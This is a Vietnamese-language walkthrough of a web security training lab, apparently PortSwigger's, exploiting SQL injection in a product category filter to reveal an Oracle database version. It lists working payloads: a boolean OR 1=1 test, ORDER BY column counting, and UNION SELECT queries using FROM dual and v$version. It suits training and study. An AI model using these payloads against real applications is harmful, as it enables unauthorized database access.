![Giao diện lab ban đầu](images/Pasted%20image%2020260604100442.png)
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Corporate gifts thì ta thấy ở url:
```LINK
https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?category=Corporate+gifts
```
Ta thấy có phần `category=Corporate+gifts` rất đáng nghi đây là một lỗi về SQLi,ta thử 
`' OR 1=1--` vào url:
```LINK
https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?category=Corporate+gifts'+OR+1=1--
```
Ta thấy nó hiện hết các mục vốn không thuộc `Corporate gifts` => SQLi
-Mục tiêu của lab là hiện ra thông tin phiên bản của Oracle

# Khai thác
-Đầu tiên trước hết ta phải xác định số cột của truy vấn đầu tiên bằng cách dùng `' ORDER BY 1,2,3,..--
```LINK
https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+1--
https://0a22007404125d9680fc08f9002d00ac.web-security-academy.net/filter?category=Corporate+gifts%27+ORDER+BY+2--
```
Khi đến `ORDER BY 3---` thì server bị lỗi 
![ORDER BY 3 bị lỗi](images/Pasted%20image%2020260604110517.png)
=> câu truy vấn trước có 2 cột
Tiếp theo ta xác định kiểu dữ liệu của từng cột,ta bắt đầu với thử 2 cột là text:
![UNION SELECT text không có FROM dual bị lỗi](images/Pasted%20image%2020260604110641.png)
Nhưng nó lại bị lỗi Internal Server Error??

Lý do:Oracle yêu cầu nếu muốn tạo chuỗi để test ta phải dùng bảng `dual` là bảng giả

Vậy ta phải thêm `FROM dual`:
```SQL
' UNION SELECT 'abc','xyz' FROM dual--
```
![UNION SELECT text với FROM dual thành công](images/Pasted%20image%2020260604111025.png)
=> cả 2 cột của câu truy vấn trước là text nên ta có thể để version ở cột nào cũng được :v
Ta tiến hành sử dụng `UNION SELECT`:
```SQL
' UNION SELECT NULL,banner FROM v$version--
```
![Hiển thị Oracle version từ v$version](images/Pasted%20image%2020260604111523.png)
=>solved!
